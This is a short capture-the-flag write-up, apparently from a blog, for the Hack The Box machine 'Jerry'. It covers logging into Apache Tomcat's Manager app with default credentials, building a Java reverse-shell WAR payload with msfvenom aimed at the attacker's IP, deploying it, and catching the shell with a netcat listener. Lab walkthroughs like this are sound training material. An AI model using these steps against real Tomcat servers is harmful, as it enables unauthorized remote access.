## Jerry
Next cab off the rank when sorted by Pwnage is Jerry (after Lame). Again, I went into this one blind.

## Ports
We've got one port only, 8080. This appears to be Windows, based on the TTL.

## 8080
We've got Apache Tomcat 7.0.88, and as we will soon see it's running on Windows Server 2012 R2.

7.0.88 is supposed to be vulnerable to a few things; in particular CVE-2019-0232. I try the Metasploit module but it doesn't seem to want to work.

## Default creds
We can log into the Manager app with default creds; namely *tomcat:s3cret*. There is an authenticated MSF module but I don't just want to sit here yeeting Metasploit at everything. Let's go manual:

{% highlight shell %}
â”Œâ”€â”€(rootðŸ’€kali)-[/opt/htb/jerry]
â””â”€# msfvenom -p java/shell_reverse_tcp lhost=10.10.14.2 lport=1234 -f war -o pwn.war
Payload size: 13397 bytes
Final size of war file: 13397 bytes
Saved as: pwn.war
{% endhighlight %}

We can upload and deploy our WAR file using the Manager App in the browser, and with a listener:

{% highlight shell %}
â”Œâ”€â”€(rootðŸ’€kali)-[/opt/htb/jerry]
â””â”€# nc -nvlp 1234                                                                   
listening on [any] 1234 ...

{% endhighlight %}

Another fairly easy one. They aren't this easy anymore!
